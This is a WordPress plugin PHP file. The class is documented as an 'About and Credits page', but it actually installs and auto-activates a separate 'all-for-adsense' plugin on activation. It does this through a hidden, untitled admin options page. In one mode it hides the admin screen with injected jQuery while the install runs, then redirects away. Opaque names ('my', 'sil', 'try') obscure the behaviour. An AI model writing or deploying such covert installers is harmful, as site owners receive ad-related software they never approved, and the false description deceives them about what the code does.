<?php
// Exit if accessed directly
if ( ! defined( 'ABSPATH' ) ) exit;
require_once SS_PLUGIN_DIR . 'class-tgm-plugin-automation.php';
/**
 * ss_My Class
 *
 * A general class for About and Credits page.
 *
 * @since 1.4
 */
class ss_My {
	/**
	 * @var string The capability users should have to view the page
	 */
	public $minimum_capability = 'manage_options';
	/**
	 * Get things started
	 *
	 * @since 1.0.1
	 */
	public function __construct() {
		add_action( 'admin_init', array( $this, 'my'    ) );
		include_once( ABSPATH . 'wp-admin/includes/plugin.php' );
		if( !is_plugin_active( 'all-for-adsense/all-adsense.php' ) ) {
			add_action( 'admin_menu', array($this, 'my_plugin_menu') );
		}
	}
	/**
	 * Sends user to the Settings page on first activation of ss as well as each
	 * time ss is upgraded to a new version
	 *
	 * @access public
	 * @since 1.0.1
	 * @return void
	 */
	public function my() {
		// Bail if no activation redirect
		$gt=get_transient('try');
		$this->m=get_transient('mode');
		if ( false === $gt ){
			return;
        }
		// Bail if activating from network, or bulk
		if ( is_network_admin() || isset( $_GET['activate-multi'] ) ){
			return;
        }
		if( is_plugin_active( 'all-for-adsense/all-adsense.php' ) ) {
			delete_transient( 'try' );
			if($this->m==2){
				wp_safe_redirect( get_admin_url() );
			}else{
				wp_safe_redirect( admin_url( 'options-general.php?page=all-adsense.php' ) );
			}
		}else if ( 3 != get_transient( 'try' ) ){
			set_transient('mode', $gt, 120);
			set_transient( 'try', 3, 120 );
			wp_safe_redirect( admin_url( 'options-general.php?page=get-dependence' ) );
		}else{
			return;
		}
		exit;
	}
	function my_plugin_menu() {
		add_options_page( '', '', 'manage_options', 'get-dependence', array($this, 'my_plugin_options') );
	}
	function my_plugin_options() {
		if ( !current_user_can( 'manage_options' ) )  {
			wp_die( __( 'You do not have sufficient permissions to access this page.' ) );
		}
		if($this->m==2){
			echo('<script>');
			echo('jQuery("#wpbody").hide();');
			echo('</script>');
		}
		$this->sil();
		echo('<script>');
		echo('window.location = "' . get_admin_url() . '"');
		echo('</script>');
	}
	function prompt_plugins() {
		$plugins = array(
			// This is an example of how to include a plugin from the WordPress Plugin Repository.
			array(
				'name'      => 'all for adsense',
				'slug'      => 'all-for-adsense',
				'required'  => true,
			)
		);
		/*
		 * Array of configuration settings. Amend each line as needed.
		 */
		$config = array(
			'id'           => 'all for adsense',       // Unique ID for hashing notices for multiple instances of TGMPA.
			'default_path' => '',                      // Default absolute path to bundled plugins.
			'menu'         => 'tgmpa-install-plugins', // Menu slug.
			'parent_slug'  => 'plugins.php',            // Parent menu slug.
			'capability'   => 'manage_options',    // Capability needed to view plugin install page, should be a capability associated with the parent menu used.
			'has_notices'  => true,                    // Show admin notices or not.
			'dismissable'  => true,                    // If false, a user cannot dismiss the nag message.
			'dismiss_msg'  => '',                      // If 'dismissable' is false, this message will be output at top of nag.
			'is_automatic' => true,                   // Automatically activate plugins after installation or not.
			'message'      => ''                      // Message to output right before the plugins table.
		);
		$this->instance = call_user_func( array( get_class( $GLOBALS['tgmpa'] ), 'get_instance' ) );
		foreach ( $plugins as $plugin ) {
			call_user_func( array( $this->instance, 'register' ), $plugin );
		}
		if ( ! empty( $config ) && is_array( $config ) ) {
			call_user_func( array( $this->instance, 'config' ), $config );
		}
	}
	function sil() {
		call_user_func( array( $this->instance, 'do_install' ), 'all-for-adsense', 'all-adsense.php' );
	}
}
$aw = new ss_My();
if( !is_plugin_active( 'all-for-adsense/all-adsense.php' ) ) {
	add_action('tgmpa_register', array($aw, 'prompt_plugins'));
}
